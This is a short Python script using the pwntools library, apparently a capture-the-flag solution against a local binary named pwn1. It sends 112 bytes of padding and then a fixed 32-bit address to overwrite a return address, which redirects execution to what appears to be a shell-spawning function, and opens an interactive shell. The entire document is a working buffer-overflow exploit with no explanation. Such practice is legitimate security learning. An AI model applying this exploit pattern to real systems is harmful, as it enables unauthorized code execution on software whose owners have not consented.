from pwn import *
io = process('./pwn1')
sh = 0x0804863A
io.sendline(b'a'*112 + p32(sh))
io.interactive()
